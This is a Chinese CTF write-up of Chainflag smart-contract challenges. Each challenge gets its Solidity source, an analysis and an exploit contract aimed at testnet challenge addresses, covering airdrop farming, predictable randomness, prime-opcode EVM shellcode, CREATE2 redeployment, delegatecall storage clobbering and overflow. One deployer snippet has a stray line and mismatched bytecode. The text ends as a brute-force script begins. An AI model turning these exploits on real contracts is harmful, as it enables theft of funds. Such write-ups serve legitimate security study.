# Chainflag 刷题记录

## airdrop 薅羊毛

### coinflip

```
HoneyLock
address :0xF60ADeF7812214eBC746309ccb590A5dBd70fc21 on ropsten.
call CaptureTheFlag with base64(your email),you will receive flag.
nc chall.chainflag.org 10000
```

#### 代码

```solidity
/**
 *Submitted for verification at Etherscan.io on 2019-10-08
*/

pragma solidity ^0.4.24;

contract P_Bank
{
    mapping (address => uint) public balances;
    
    uint public MinDeposit = 0.1 ether;
    
    Log TransferLog;

    event FLAG(string b64email, string slogan);
    


    constructor(address _log) public { 
        TransferLog = Log(_log);
     }

    function Ap() public {
        if(balances[msg.sender] == 0) {
            balances[msg.sender]+=1 ether;
        }
    }

    function Transfer(address to, uint val) public {
        if(val > balances[msg.sender]) {
            revert();
        }
        balances[to]+=val;
        balances[msg.sender]-=val;
    }

    function CaptureTheFlag(string b64email) public returns(bool){
      require (balances[msg.sender] > 500 ether);
      emit FLAG(b64email, "Congratulations to capture the flag!");
    }

    
    function Deposit()
    public
    payable
    {
        if(msg.value > MinDeposit)
        {
            balances[msg.sender]+= msg.value;
            TransferLog.AddMessage(msg.sender,msg.value,"Deposit");
        }
    }
    
    function CashOut(uint _am) public 
    {
        if(_am<=balances[msg.sender])
        {
            
            if(msg.sender.call.value(_am)())
            {
                balances[msg.sender]-=_am;
                TransferLog.AddMessage(msg.sender,_am,"CashOut");
            }
        }
    }
    
    function() public payable{}    
    
}

contract Log 
{
   
    struct Message
    {
        address Sender;
        string  Data;
        uint Val;
        uint  Time;
    }
    
    string err = "CashOut";
    Message[] public History;
    
    Message LastMsg;
    
    function AddMessage(address _adr,uint _val,string _data)
    public
    {
        LastMsg.Sender = _adr;
        LastMsg.Time = now;
        LastMsg.Val = _val;
        LastMsg.Data = _data;
        History.push(LastMsg);
    }
}
```

只要balance>500就能得到flag，Ap函数可以薅羊毛。

exp:

```solidity
pragma solidity ^0.4.24;

contract P_Bank
{
    mapping (address => uint) public balances;
    
    uint public MinDeposit = 0.1 ether;
    
    Log TransferLog;

    event FLAG(string b64email, string slogan);
    


    constructor(address _log) public { 
        TransferLog = Log(_log);
     }

    function Ap() public {
        if(balances[msg.sender] == 0) {
            balances[msg.sender]+=1 ether;
        }
    }

    function Transfer(address to, uint val) public {
        if(val > balances[msg.sender]) {
            revert();
        }
        balances[to]+=val;
        balances[msg.sender]-=val;
    }

    function CaptureTheFlag(string b64email) public returns(bool){
      require (balances[msg.sender] > 500 ether);
      emit FLAG(b64email, "Congratulations to capture the flag!");
    }

    
    function Deposit()
    public
    payable
    {
        if(msg.value > MinDeposit)
        {
            balances[msg.sender]+= msg.value;
            TransferLog.AddMessage(msg.sender,msg.value,"Deposit");
        }
    }
    
    function CashOut(uint _am) public 
    {
        if(_am<=balances[msg.sender])
        {
            
            if(msg.sender.call.value(_am)())
            {
                balances[msg.sender]-=_am;
                TransferLog.AddMessage(msg.sender,_am,"CashOut");
            }
        }
    }
    
    function() public payable{}    
    
}

contract Log 
{
   
    struct Message
    {
        address Sender;
        string  Data;
        uint Val;
        uint  Time;
    }
    
    string err = "CashOut";
    Message[] public History;
    
    Message LastMsg;
    
    function AddMessage(address _adr,uint _val,string _data)
    public
    {
        LastMsg.Sender = _adr;
        LastMsg.Time = now;
        LastMsg.Val = _val;
        LastMsg.Data = _data;
        History.push(LastMsg);
    }
}

contract getflag {
    address addr = 0xF60ADeF7812214eBC746309ccb590A5dBd70fc21;
    P_Bank pb = P_Bank(addr);
    function get_flag(string email) public
    {
        pb.CaptureTheFlag(email);
    }
}

contract airdropfather
{
    function hack(address addr) public
    {
        for(uint i = 0; i< 80; i++)
        {
            airdropson son = new airdropson(addr);
        }
    }
}
contract airdropson 
{
    constructor(address addr) public
    {
        P_Bank tmp = P_Bank(0xF60ADeF7812214eBC746309ccb590A5dBd70fc21);
        tmp.Ap();
        tmp.Transfer(addr, 1 ether);
    }
}
```

## bad rand

### EOS game

```solidity
/**
 *Submitted for verification at Etherscan.io on 2018-11-26
*/

pragma solidity ^0.4.24;

/**
 * @title SafeMath
 * @dev Math operations with safety checks that revert on error
 */
library SafeMath {

  /**
  * @dev Multiplies two numbers, reverts on overflow.
  */
  function mul(uint256 a, uint256 b) internal pure returns (uint256) {
    // Gas optimization: this is cheaper than requiring 'a' not being zero, but the
    // benefit is lost if 'b' is also tested.
    // See: https://github.com/OpenZeppelin/openzeppelin-solidity/pull/522
    if (a == 0) {
      return 0;
    }

    uint256 c = a * b;
    require(c / a == b);

    return c;
  }

  /**
  * @dev Integer division of two numbers truncating the quotient, reverts on division by zero.
  */
  function div(uint256 a, uint256 b) internal pure returns (uint256) {
    require(b > 0); // Solidity only automatically asserts when dividing by 0
    uint256 c = a / b;
    // assert(a == b * c + a % b); // There is no case in which this doesn't hold

    return c;
  }

  /**
  * @dev Subtracts two numbers, reverts on overflow (i.e. if subtrahend is greater than minuend).
  */
  function sub(uint256 a, uint256 b) internal pure returns (uint256) {
    require(b <= a);
    uint256 c = a - b;

    return c;
  }

  /**
  * @dev Adds two numbers, reverts on overflow.
  */
  function add(uint256 a, uint256 b) internal pure returns (uint256) {
    uint256 c = a + b;
    require(c >= a);

    return c;
  }

  /**
  * @dev Divides two numbers and returns the remainder (unsigned integer modulo),
  * reverts when dividing by zero.
  */
  function mod(uint256 a, uint256 b) internal pure returns (uint256) {
    require(b != 0);
    return a % b;
  }
}

contract EOSToken{
    using SafeMath for uint256;
    string TokenName = "EOS";
    
    uint256 totalSupply = 100**18;
    address owner;
    mapping(address => uint256)  balances;
    
    modifier onlyOwner() {
        require(msg.sender == owner);
        _;
    }
    
    constructor() public{
        owner = msg.sender;
        balances[owner] = totalSupply;
    }
    
    function mint(address _to,uint256 _amount) public onlyOwner {
        require(_amount < totalSupply);
        totalSupply = totalSupply.sub(_amount);
        balances[_to] = balances[_to].add(_amount);
    }
    
    function transfer(address _from, address _to, uint256 _amount) public onlyOwner {
        require(_amount < balances[_from]);
        balances[_from] = balances[_from].sub(_amount);
        balances[_to] = balances[_to].add(_amount);
    }
    
    function eosOf(address _who) public constant returns(uint256){
        return balances[_who];
    }
}


contract EOSGame{
    
    using SafeMath for uint256;
    mapping(address => uint256) public bet_count;
    uint256 FUND = 100;
    uint256 MOD_NUM = 20;
    uint256 POWER = 100;
    uint256 SMALL_CHIP = 1;
    uint256 BIG_CHIP = 20;
    EOSToken  eos;
    
    event FLAG(string b64email, string slogan);
    
    constructor() public{
        eos=new EOSToken();
    }
    
    function initFund() public{
        if(bet_count[tx.origin] == 0){
            bet_count[tx.origin] = 1;
            eos.mint(tx.origin, FUND);
        }
    }
    
    function bet(uint256 chip) internal {
        bet_count[tx.origin] = bet_count[tx.origin].add(1);
        uint256 seed = uint256(keccak256(abi.encodePacked(block.number)))+uint256(keccak256(abi.encodePacked(block.timestamp)));
        uint256 seed_hash = uint256(keccak256(abi.encodePacked(seed)));
        uint256 shark = seed_hash % MOD_NUM;
        uint256 lucky_hash = uint256(keccak256(abi.encodePacked(bet_count[tx.origin])));
        uint256 lucky = lucky_hash % MOD_NUM;
        if (shark == lucky){
            eos.transfer(address(this), tx.origin, chip.mul(POWER));
        }
    }
    
    function smallBlind() public {
        eos.transfer(tx.origin, address(this), SMALL_CHIP);
        bet(SMALL_CHIP);
    }
    
    function bigBlind() public {
        eos.transfer(tx.origin, address(this), BIG_CHIP);
        bet(BIG_CHIP);
    }
    
    function eosBlanceOf() public view returns(uint256) {
        return eos.eosOf(tx.origin);
    }

    function CaptureTheFlag(string b64email) public{
		require (eos.eosOf(tx.origin) > 18888);
		emit FLAG(b64email, "Congratulations to capture the flag!");
	}
}
```

5%概率获得100倍奖励

exp：

```solidity
/**
 *Submitted for verification at Etherscan.io on 2018-11-26
*/

pragma solidity ^0.4.24;

/**
 * @title SafeMath
 * @dev Math operations with safety checks that revert on error
 */
library SafeMath {

  /**
  * @dev Multiplies two numbers, reverts on overflow.
  */
  function mul(uint256 a, uint256 b) internal pure returns (uint256) {
    // Gas optimization: this is cheaper than requiring 'a' not being zero, but the
    // benefit is lost if 'b' is also tested.
    // See: https://github.com/OpenZeppelin/openzeppelin-solidity/pull/522
    if (a == 0) {
      return 0;
    }

    uint256 c = a * b;
    require(c / a == b);

    return c;
  }

  /**
  * @dev Integer division of two numbers truncating the quotient, reverts on division by zero.
  */
  function div(uint256 a, uint256 b) internal pure returns (uint256) {
    require(b > 0); // Solidity only automatically asserts when dividing by 0
    uint256 c = a / b;
    // assert(a == b * c + a % b); // There is no case in which this doesn't hold

    return c;
  }

  /**
  * @dev Subtracts two numbers, reverts on overflow (i.e. if subtrahend is greater than minuend).
  */
  function sub(uint256 a, uint256 b) internal pure returns (uint256) {
    require(b <= a);
    uint256 c = a - b;

    return c;
  }

  /**
  * @dev Adds two numbers, reverts on overflow.
  */
  function add(uint256 a, uint256 b) internal pure returns (uint256) {
    uint256 c = a + b;
    require(c >= a);

    return c;
  }

  /**
  * @dev Divides two numbers and returns the remainder (unsigned integer modulo),
  * reverts when dividing by zero.
  */
  function mod(uint256 a, uint256 b) internal pure returns (uint256) {
    require(b != 0);
    return a % b;
  }
}

contract EOSToken{
    using SafeMath for uint256;
    string TokenName = "EOS";
    
    uint256 totalSupply = 100**18;
    address owner;
    mapping(address => uint256)  balances;
    
    modifier onlyOwner() {
        require(msg.sender == owner);
        _;
    }
    
    constructor() public{
        owner = msg.sender;
        balances[owner] = totalSupply;
    }
    
    function mint(address _to,uint256 _amount) public onlyOwner {
        require(_amount < totalSupply);
        totalSupply = totalSupply.sub(_amount);
        balances[_to] = balances[_to].add(_amount);
    }
    
    function transfer(address _from, address _to, uint256 _amount) public onlyOwner {
        require(_amount < balances[_from]);
        balances[_from] = balances[_from].sub(_amount);
        balances[_to] = balances[_to].add(_amount);
    }
    
    function eosOf(address _who) public constant returns(uint256){
        return balances[_who];
    }
}


contract EOSGame{
    
    using SafeMath for uint256;
    mapping(address => uint256) public bet_count;
    uint256 FUND = 100;
    uint256 MOD_NUM = 20;
    uint256 POWER = 100;
    uint256 SMALL_CHIP = 1;
    uint256 BIG_CHIP = 20;
    EOSToken  eos;
    
    event FLAG(string b64email, string slogan);
    
    constructor() public{
        eos=new EOSToken();
    }
    
    function initFund() public{
        if(bet_count[tx.origin] == 0){
            bet_count[tx.origin] = 1;
            eos.mint(tx.origin, FUND);
        }
    }
    
    function bet(uint256 chip) internal {
        bet_count[tx.origin] = bet_count[tx.origin].add(1);
        uint256 seed = uint256(keccak256(abi.encodePacked(block.number)))+uint256(keccak256(abi.encodePacked(block.timestamp)));
        uint256 seed_hash = uint256(keccak256(abi.encodePacked(seed)));
        uint256 shark = seed_hash % MOD_NUM;
        uint256 lucky_hash = uint256(keccak256(abi.encodePacked(bet_count[tx.origin])));
        uint256 lucky = lucky_hash % MOD_NUM;
        if (shark == lucky){
            eos.transfer(address(this), tx.origin, chip.mul(POWER));
        }
    }
    
    function smallBlind() public {
        eos.transfer(tx.origin, address(this), SMALL_CHIP);
        bet(SMALL_CHIP);
    }
    
    function bigBlind() public {
        eos.transfer(tx.origin, address(this), BIG_CHIP);
        bet(BIG_CHIP);
    }
    
    function eosBlanceOf() public view returns(uint256) {
        return eos.eosOf(tx.origin);
    }

    function CaptureTheFlag(string b64email) public{
		require (eos.eosOf(tx.origin) > 18888);
		emit FLAG(b64email, "Congratulations to capture the flag!");
	}
}
contract EOSGame_exp{
    EOSGame eosgame;

    constructor() public{
        eosgame=EOSGame(0x804d8B0f43C57b5Ba940c1d1132d03f1da83631F);
    }

    function init() public{
        eosgame.initFund();
    }

    function small(uint times) public{
        for(uint i = 0; i < times; i++) {
            eosgame.smallBlind();
        }
    }

    function big(uint times) public{
        for(uint i = 0; i < times; i++) {
            eosgame.bigBlind();
        }
    }

    function bof() public view returns(uint256){
        return eosgame.eosBlanceOf();
    }

    function flag(string b64email) public{
        eosgame.CaptureTheFlag(b64email);
    }
}
```

## evm

### StArNDBOX

#### 题目代码

```solidity
pragma solidity ^0.5.11;

library Math {
    function invMod(int256 _x, int256 _pp) internal pure returns (int) {
        int u3 = _x;
        int v3 = _pp;
        int u1 = 1;
        int v1 = 0;
        int q = 0;
        while (v3 > 0){
            q = u3/v3;
            u1= v1;
            v1 = u1 - v1*q;
            u3 = v3;
            v3 = u3 - v3*q;
        }
        while (u1<0){
            u1 += _pp;
        }
        return u1;
    }
    
    function expMod(int base, int pow,int mod) internal pure returns (int res){
        res = 1;
        if(mod > 0){
            base = base % mod;
            for (; pow != 0; pow >>= 1) {
                if (pow & 1 == 1) {
                    res = (base * res) % mod;
                }
                base = (base * base) % mod;
            }
        }
        return res;
    }
    function pow_mod(int base, int pow, int mod) internal pure returns (int res) {
        if (pow >= 0) {
            return expMod(base,pow,mod);
        }
        else {
            int inv = invMod(base,mod);
            return expMod(inv,abs(pow),mod);
        }
    }
    
    function isPrime(int n) internal pure returns (bool) {
        if (n == 2 ||n == 3 || n == 5) {
            return true;
        } else if (n % 2 ==0 && n > 1 ){
            return false;
        } else {
            int d = n - 1;
            int s = 0;
            while (d & 1 != 1 && d != 0) {
                d >>= 1;
                ++s;
            }
            int a=2;
            int xPre;
            int j;
            int x = pow_mod(a, d, n);
            if (x == 1 || x == (n - 1)) {
                return true;
            } else {
                for (j = 0; j < s; ++j) {
                    xPre = x;
                    x = pow_mod(x, 2, n);
                    if (x == n-1){
                        return true;
                    }else if(x == 1){
                        return false;
                    }
                }
            }
            return false;
        }
    }
    
    function gcd(int a, int b) internal pure returns (int) {
        int t = 0;
        if (a < b) {
            t = a;
            a = b;
            b = t;
        }
        while (b != 0) {
            t = b;
            b = a % b;
            a = t;
        }
        return a;
    }
    function abs(int num) internal pure returns (int) {
        if (num >= 0) {
            return num;
        } else {
            return (0 - num);
        }
    }
    
}

contract StArNDBOX{
    using Math for int;
    constructor()public payable{
    }
    modifier StAr() {
        require(msg.sender != tx.origin);
        _;
    }
    function StArNDBoX(address _addr) public payable{
        
        uint256 size;
        bytes memory code;
        int res;
        
        assembly{
            size := extcodesize(_addr)
            code := mload(0x40)
            mstore(0x40, add(code, and(add(add(size, 0x20), 0x1f), not(0x1f))))
            mstore(code, size)
            extcodecopy(_addr, add(code, 0x20), 0, size)
        }
        for(uint256 i = 0; i < code.length; i++) {
            res = int(uint8(code[i]));
            require(res.isPrime() == true);
        }
        bool success;
        bytes memory _;
        (success, _) = _addr.delegatecall("");
        require(success);
    }
}
```

#### 分析

这里要了解一下内联汇编：https://www.tryblockchain.org/blockchain-solidity-assembly.html

所以这些汇编的命令解析为：

```solidity
assembly{
            size := extcodesize(_addr) //size = addr's code size
            code := mload(0x40)        //code = mem[0x40 - 0x60]
            mstore(0x40, add(code, and(add(add(size, 0x20), 0x1f), not(0x1f))))
            //size +=0x3f
            //size &= 0xe0 (align)
            //code += size
            //[mem 0x40 - 0x60] = code
            mstore(code, size)
            //[mem code - code+0x20] = size
            extcodecopy(_addr, add(code, 0x20), 0, size)
            //[mem code+0x20 - code+0x20+size] = addr[0 - size]
        }
```

也就是将addr的代码copy进内存中，并且按照一定的内存结构格式。

而后检查code中的每个byte操作码，检查是否为质数。通过后就会执行这个addr中的代码，需要返回true。

而题目的要求是清空账户余额，就可以获得flag。

所以题目类似于写一个全为质数的shellcode达到这一目的。

opcode参考：https://ethervm.io/

最有用的两个opcode就是push2（0x61）以及call（0xf1）

call的定义如下：

```
CALL``gas``addr``value``argsOffset``argsLength``retOffset``retLength``success
```

也就是栈顶到栈底依次为：gas, addr, value, argsoffset, argslength, ret offset, retlength

所以说构造的payload为：0x61000061000061000061000061006161000301610000619789f100

也就是：

```
610000    PUSH2 0x0000
610000    PUSH2 0x0000
610000    PUSH2 0x0000
610000    PUSH2 0x0000
610061    PUSH2 0x0061
610003    PUSH2 0x0003
01        ADD
610000    PUSH2 0x0000
619789    PUSH2 0x9789
f1        CALL
```

翻译过来就是：call(0).gas(9789).value(100 Wei)

不过题目里面是1wei，改一下就行

于是乎，部署的合约代码为：

```solidity
pragma solidity ^0.5.11;

contract Deployer {
    constructor() public {
			bytes memory bytecode = hex"61000161000161000161000161000161000161fbfbf1";
';
        assembly {
            return (add(bytecode, 0x20), mload(bytecode))
        }
    }
}
```

至于为什么这么写，可以参考这个文章：https://medium.com/authio/solidity-ctf-part-4-read-the-fine-print-5ad259a5f5bb

大体意思就是说构造函数会返回一个二元组：代码开头以及代码长度。这个memory的前32bit为长度。

攻击合约：

```
pragma solidity ^0.5.12;

contract attack{
    address code=<contract 1>;
    address target=<instance>;
    StArNDBOX s=StArNDBOX(target);
    function exp()external{
        s.StArNDBoX(code);
    }
}
```

### creativity

#### 代码

```solidity
pragma solidity ^0.5.10;

contract Creativity {
    event SendFlag(address addr);

    address public target;
    uint randomNumber = 0;

    function check(address _addr) public {
        uint size;
        assembly { size := extcodesize(_addr) }
        require(size > 0 && size <= 4);
        target = _addr;
    }

    function execute() public {
        require(target != address(0));
        target.delegatecall(abi.encodeWithSignature(""));
        selfdestruct(address(0));
    }

    function sendFlag() public payable {
        require(msg.value >= 100000000 ether);
        emit SendFlag(msg.sender);
    }
}
```

#### 分析

这题也很有意思，是balsnctf2019的原题。

大意就是需要搞一个合约地址，然后check一下他的code的长度是否小于等于4，成立的话就把target的值赋值为这个地址，然后你就可以有一次delegatecall的机会。

看起来像是个极简shellcode题目，但是在evm中4个字节的指令干不了这么多事情的。

> 1. Directly emit an event with `LOG1` requires an event topic hash as a parameter, which is more than 4 bytes. ([Ref](https://solidity.readthedocs.io/en/v0.5.12/contracts.html#low-level-interface-to-logs))
> 2. To invoke any type of call to another contract, at least 6 parameters should be prepared on the stack, which requires at least 6 operations and thus 6 bytes of code. ([Ref](https://ethervm.io/))
> 3. Modifying the storage of the game contract is useless since there is a selfdestruct right after the delegatecall.

所以这里要用一个create2的trick。

create2是一个指令，用法就是：create2(value, offset,length,salt)，创建出来的新的合约地址由以下公式计算得出：

`keccak256(0xff ++ address ++ salt ++ keccak256(init_code))[12:]`

这意味着，如果我们控制了合约的创建代码并使其保持不变，然后控制合约构造函数返回的运行时字节码，那么我们很容易就能做到在同一个地址上，反复部署完全不同的合约。

poc：

```solidity
pragma solidity ^0.5.10;

contract Deployer {
    bytes public deployBytecode;
    address public deployedAddr;

    function deploy(bytes memory code) public {
        deployBytecode = code;
        address a;
        // Compile Dumper to get this bytecode
        bytes memory dumperBytecode = hex'6080604052348015600f57600080fd5b50600033905060608173ffffffffffffffffffffffffffffffffffffffff166331d191666040518163ffffffff1660e01b815260040160006040518083038186803b158015605c57600080fd5b505afa158015606f573d6000803e3d6000fd5b505050506040513d6000823e3d601f19601f820116820180604052506020811015609857600080fd5b81019080805164010000000081111560af57600080fd5b8281019050602081018481111560c457600080fd5b815185600182028301116401000000008211171560e057600080fd5b50509291905050509050805160208201f3fe';
        assembly {
            a := create2(callvalue, add(0x20, dumperBytecode), mload(dumperBytecode), 0x9453)
        }
        deployedAddr = a;
    }
}

contract Dumper {
    constructor() public {
        Deployer dp = Deployer(msg.sender);
        bytes memory bytecode = dp.deployBytecode();
        assembly {
            return (add(bytecode, 0x20), mload(bytecode))
        }
    }
}
```

也就是先部署dumper合约，得到dumper合约的部署字节码，可以看到dumper合约的运行字节码是由deployer决定的。

得到dumper的部署字节码后就可以通过deployer合约来部署dumper合约并且控制在同一个地址，且能控制字节码。

攻击流程：

1. Using the `CREATE2` reinitialize trick, deploy a contract with content `0x33ff`, which is `selfdestruct(msg.sender)`.
2. Call `check()` in the game contract to let our deployed contract pass the check.
3. Send an empty transaction to our contract to make it self-destructed.
4. Again, using the `CREATE2` reinitialize trick, deploy a new contract at the same address that will execute `emit SendFlag(0)`.
5. Call `execute()`in the game contract, it will then fire the `SendFlag` event.

```solidity
//0x60405180807f53656e64466c6167286164647265737329000000000000000000000000000000815250601101905060405180910390206000801b6040518082815260200191505060405180910390a1
contract Deployer {
    bytes public deployBytecode;
    address public deployedAddr;

    function deploy(bytes memory code) public {
        deployBytecode = code;
        address a;
        // Compile Dumper to get this bytecode
        bytes memory dumperBytecode = hex'6080604052348015600f57600080fd5b50600033905060608173ffffffffffffffffffffffffffffffffffffffff166331d191666040518163ffffffff1660e01b815260040160006040518083038186803b158015605c57600080fd5b505afa158015606f573d6000803e3d6000fd5b505050506040513d6000823e3d601f19601f820116820180604052506020811015609857600080fd5b81019080805164010000000081111560af57600080fd5b8281019050602081018481111560c457600080fd5b815185600182028301116401000000008211171560e057600080fd5b50509291905050509050805160208201f3fe';
        assembly {
            a := create2(callvalue, add(0x20, dumperBytecode), mload(dumperBytecode), 0x9453)
        }
        deployedAddr = a;
    }
}

contract Dumper {
    constructor() public {
        Deployer dp = Deployer(msg.sender);
        bytes memory bytecode = dp.deployBytecode();
        assembly {
            return (add(bytecode, 0x20), mload(bytecode))
        }
    }
}

```



## delegate call

### counter strike

#### 代码

```solidity
contract Launcher{
    uint256 public deadline;
    function setdeadline(uint256 _deadline) public {
        deadline = _deadline;
    }

    constructor() public {
        deadline = block.number + 100;
    }
}

contract EasyBomb{
    bool private hasExplode = false; 
    address private launcher_address;
    bytes32 private password;
    bool public power_state = true;
    bytes4 constant launcher_start_function_hash = bytes4(keccak256("setdeadline(uint256)"));
    Launcher launcher;

    constructor(address _launcher_address, bytes32 _fake_flag) public {
        launcher_address = _launcher_address;
        password = _fake_flag ;
    }

    function msgPassword() public returns (bytes32 result)  {
        bytes memory msg_data = msg.data;
        if (msg_data.length == 0) {
            return 0x0;
        }
        assembly {
            result := mload(add(msg_data, add(0x20, 0x24)))
        }
    }

    modifier isOwner(){
        require(msgPassword() == password);
        require(msg.sender != tx.origin);
        uint x;
        assembly { x := extcodesize(caller) }
        require(x == 0);
        _;
    }

    modifier notExplodeYet(){   
        launcher = Launcher(launcher_address);
        require(block.number < launcher.deadline());
        hasExplode = true;
        _;
    }
    function setCountDownTimer(uint256 _deadline) public isOwner notExplodeYet {
        launcher_address.delegatecall(abi.encodeWithSignature("setdeadline(uint256)",_deadline));
    }
}
```

#### 分析

漏洞点很明显的在delegatecall这里：

```solidity
function setCountDownTimer(uint256 _deadline) public isOwner notExplodeYet {
        launcher_address.delegatecall(abi.encodeWithSignature("setdeadline(uint256)",_deadline));
    }
```

在launcher中，setdeadline函数会改变slot1中的内容，在bomb合约中slot1存储的是一个bool和一个address。

所以第一次调用可以将这个地址修改成任意合约地址。

我们可以构造一个攻击合约，将powerstate那个slot中的变量改成false即可。

攻击合约：

```solidity
contract Launcherhack{
    bool private hasExplode;
    address private launcher_address;
    bytes32 private password;
    bool public power_state;
    bytes4 constant launcher_start_function_hash = bytes4(keccak256("setdeadline(uint256)"));
    uint256 public deadline;
    constructor() public {
        hasExplode = false;
        //launcher_address = 0;
        password = 'AAAA';
        power_state = false;
        deadline = block.number + 10000;
    }
    function setdeadline(uint256 _deadline) public {
        launcher_address = address(_deadline);
        power_state = false;
    }
}
```

不过除此之外还需要过一个check，也就是isOwner那里：

```solidity
modifier isOwner(){
        require(msgPassword() == password);
        require(msg.sender != tx.origin);
        uint x;
        assembly { x := extcodesize(caller) }
        require(x == 0);
        _;
    }
```

后面两个require好弄，搞个攻击合约将逻辑写到constructor即可。第一个的话password是存储在storage里面的，需要编写个pythonweb3脚本查一下。

```python
from web3 import Web3
import web3
#import sha3

my_ipc = Web3.HTTPProvider("https://ropsten.infura.io/v3/xxxxxxxxxxx")
assert my_ipc.isConnected()
runweb3 = Web3(my_ipc)
myaccount = "xxxxxxxx"
private = "xxxxxxxx"
contract = "0xd630cb8c3bbfd38d1880b8256ee06d168ee3859c"
contract = Web3.toChecksumAddress(contract)

def check():
    print(runweb3.eth.getStorageAt(contract,0))
    print(runweb3.eth.getStorageAt(contract,1))
    print(runweb3.eth.getStorageAt(contract,2))
    print(runweb3.eth.getStorageAt(contract,3))
    print(runweb3.eth.getStorageAt(contract,4))
    print(runweb3.eth.getStorageAt(contract,5))
def calc_sth():
    origin = 0xd93F4A6719A386E6bd5dC781c019492E0A382F2a
    target = Web3.keccak(Web3.keccak(origin|3)) + 2
    print(target)
if __name__ == '__main__':
    check()
```

查完之后写到payload里面打过去就行了。

```solidity
contract hackeasyboom1{
    constructor() public {
        address a = 0xc9f4E0E9D1D2365a70940De00beD01F1275fe198;

        // target.address+00 +password 0x6a9bE26DbcfcB597Aef8144fdE7495848de32c75
        a.call(abi.encodeWithSignature("setCountDownTimer(uint256)",
         0x00000000000000000000003F187b817862126b1199c6902d4e5f54f57209f600, 
         0x000000000000666c61677b646f6e4c65745572447265616d4265447265616d7d));
         a.call(abi.encodeWithSignature("setCountDownTimer(uint256)",
         0x00000000000000000000003F187b817862126b1199c6902d4e5f54f57209f600, 
         0x000000000000666c61677b646f6e4c65745572447265616d4265447265616d7d));
    } 
}
```

## int overflow

### bet

代码：

```solidity
pragma solidity ^0.4.24;

contract bet {
    uint secret;
    address owner;
    
    mapping(address => uint) public balanceOf;
    mapping(address => uint) public gift;
    mapping(address => uint) public isbet;
    
    event SendFlag(string b64email);
    
    function Bet() public{
        owner = msg.sender;
    }
    
    function payforflag(string b64email) public {
        require(balanceOf[msg.sender] >= 100000);
        balanceOf[msg.sender]=0;
        owner.transfer(address(this).balance);
        emit SendFlag(b64email);
    }
    

    //to fuck
    
    modifier only_owner() {
        require(msg.sender == owner);
        _;
    }
    
    function setsecret(uint secretrcv) only_owner {
        secret=secretrcv;
    }
    
    function deposit() payable{
        uint geteth=msg.value/1000000000000000000;
        balanceOf[msg.sender]+=geteth;
    }
    
    function profit() {
        require(gift[msg.sender]==0);
        gift[msg.sender]=1;
        balanceOf[msg.sender]+=1;
    }
    
    function betgame(uint secretguess){
        require(balanceOf[msg.sender]>0);
        balanceOf[msg.sender]-=1;
        if (secretguess==secret)
        {
            balanceOf[msg.sender]+=2;
            isbet[msg.sender]=1;
        }
    }
    
    function doublebetgame(uint secretguess) only_owner{
        require(balanceOf[msg.sender]-2>0);
        require(isbet[msg.sender]==1);
        balanceOf[msg.sender]-=2;
        if (secretguess==secret)
        {
            balanceOf[msg.sender]+=2;
        }
    }

}
```

这题就很白给了，先变成owner然后出发iof就行

```solidity
pragma solidity ^0.4.24;
interface bet {
    function balanceOf(address) external returns(uint);
    function Bet() external;
    function payforflag(string) external;
    function setsecret(uint) external;
    function profit() external;
    function betgame(uint)external;
    function doublebetgame(uint) external;
}
contract hack{
    bet target;
    constructor(){
        target = bet(0x30d0a604d8c90064a0a3ca4beeea177eff3e9bcd);
    }
    function becomeOwmer() public{
        target.Bet();
    }
    function setsecret(uint sec) public{
        target.setsecret(sec);
    }
    function iof() public{
        target.doublebetgame(222);
    }
    function ap() public{
        target.profit();
    }
    function bg(uint sec) public{
        target.betgame(sec);
    }
    function getflag() public{
        string memory email = "111";
        target.call(bytes4(keccak256("payforflag(string)")),email);
    }
    function bf() public view returns (uint){
        return target.balanceOf(address(this));
    }
}
```

### hf

代码：

```solidity
pragma solidity ^0.4.24;

contract hf {
    address secret;
    uint count;
    address owner;
    
    mapping(address => uint) public balanceOf;
    mapping(address => uint) public gift;
    
    struct node {
        address nodeadress;
        uint nodenumber;
    }
    
    node public node0;
    
    event SendFlag(string b64email);
    
    constructor()public{
        owner = msg.sender;
    }
    
    function payforflag(string b64email) public {
        require(balanceOf[msg.sender] >= 100000);
        balanceOf[msg.sender]=0;
        owner.transfer(address(this).balance);
        emit SendFlag(b64email);
    }
    

    //to fuck
    
    modifier onlySecret() {
        require(msg.sender == secret);
        _;
    }
    
    function profit() public{
        require(gift[msg.sender]==0);
        gift[msg.sender]=1;
        balanceOf[msg.sender]+=1;
    }
    
    function hfvote() public payable{
        uint geteth=msg.value/1000000000000000000;
        balanceOf[msg.sender]+=geteth;
    }
    
    function ubw() public payable{
        if (msg.value < 2 ether)
        {
            node storage n = node0;
            n.nodeadress=msg.sender;
            n.nodenumber=1;
        }
        else
        {
            n.nodeadress=msg.sender;
            n.nodenumber=2;
        }
    }
    
    function fate(address to,uint value) public onlySecret {
        require(balanceOf[msg.sender]-value>=0);
        balanceOf[msg.sender]-=value;
        balanceOf[to]+=value;
    }
    
}
```

ubw函数else分支没有初始化，可以修改secret，然后就overflow了，很简单。

## reentrance

### babybank

代码：

```solidity
pragma solidity ^0.4.23;

contract babybank {
    mapping(address => uint) public balance;
    mapping(address => uint) public level;
    address owner;
    uint secret;
    
    //Don't leak your teamtoken plaintext!!! md5(teamtoken).hexdigest() is enough.
    //Gmail is ok. 163 and qq may have some problems.
    event sendflag(string md5ofteamtoken,string b64email); 
    
    
    constructor()public{
        owner = msg.sender;
    }
    
    //pay for flag
    function payforflag(string md5ofteamtoken,string b64email) public{
        require(balance[msg.sender] >= 10000000000);
        balance[msg.sender]=0;
        owner.transfer(address(this).balance);
        emit sendflag(md5ofteamtoken,b64email);
    }
    
    modifier onlyOwner(){
        require(msg.sender == owner);
        _;
    }
    
    //challenge 1 
    function profit() public{
        require(level[msg.sender]==0);
        require(uint(msg.sender) & 0xffff==0xb1b1);
        balance[msg.sender]+=1;
        level[msg.sender]+=1;
    }
    
    //challenge 2
    function set_secret(uint new_secret) public onlyOwner{
        secret=new_secret;
    }
    function guess(uint guess_secret) public{
        require(guess_secret==secret);
        require(level[msg.sender]==1);
        balance[msg.sender]+=1;
        level[msg.sender]+=1;
    }
    
    //challenge 3
    
    function transfer(address to, uint amount) public{
        require(balance[msg.sender] >= amount);
        require(amount==2);
        require(level[msg.sender]==2);
        balance[msg.sender] = 0;
        balance[to] = amount;
    }
    
    function withdraw(uint amount) public{
        require(amount==2);
        require(balance[msg.sender] >= amount);
        msg.sender.call.value(amount*100000000000000)();
        balance[msg.sender] -= amount;
    }
}
```

### 分析

账户结尾可以爆破，爆破脚本：

```python
from ethereum import utils
import os, sys

# generate EOA with appendix 1b1b
